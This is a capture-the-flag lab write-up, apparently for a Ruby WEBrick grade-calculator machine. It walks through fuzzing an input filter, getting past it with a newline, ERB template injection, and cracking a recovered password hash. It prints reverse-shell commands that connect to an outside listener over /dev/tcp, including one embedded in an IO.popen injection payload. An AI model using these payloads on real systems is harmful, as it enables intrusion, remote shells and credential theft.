## Web

![Image](/assets/img/post/perfection/2.png)

The web is powered by WEBrick version 1.7.0, `WEBrick is a Ruby library providing simple HTTP web servers`{: filepath}

Well, if you intercept the request u can see something like this `category1=literature` but if u try to this `category1=$` get a redirect with a text "Malicious text blocked".

We can do  with ffuf an scan for get a list of blocked characters.

```bash
ffuf -u http://10.10.11.253/weighted-grade-calc -d 'category1=FUZZ&grade1=90&weight1=30&category2=poop&grade2=100&weight2=50&category3=poop&grade3=100&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -mr Malicious
```

But what happens if a url encode the input?

```text
category1= poop%0aFUZZ &grade1=90&weight1=30&category2=poop&grade2=100&weight2=50&category3=poop&grade3=100&weight3=20&category4=N%2FA&grade4=0&weight4=0&category5=N%2FA&grade5=0&weight5=0' -w /opt/SecLists/Fuzzing/alphanum-case-extra.txt -mr Malicious
```

`%0a`â€” represents a newline character, used to `bypass input validation`.

The first thing I think is that there may be an SSTI.
We go look to in payloadallthethings if there is something for ruby

`hURL` _to encode and decode payloads showcases the manipulation of data to exploit web application vulnerabilities. The payload crafted for the Weighted Grade Calculator application is designed to execute a reverse shell command, taking advantage of any potential server-side code execution vulnerabilities_

```shell
hURL -B "bash -i >& /dev/tcp/10.10.14.78/7777 0>&1" (base64)
```

```shell
hURL -U "{_stringbase64_}" (URLencoded)
```

#### Payload
```text

```

Or use the payload `<%= IO.popen('id').readlines() %>` and urlencoded.

[Hacktricks-SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection#erb-ruby)

```bash
<%= IO.popen('bash -i >& /dev/tcp/10.10.14.78/7777 0>&1').readlines() %> 
```

Enumerating found the file .db and got the credentials.

_A string is any sequence of 4 or more printable characters .db_

### Hashcat

```bash
hashcat -m 1400 hash.txt -a 3 "susan_nasus_?d?d?d?d?d?d?d?d"
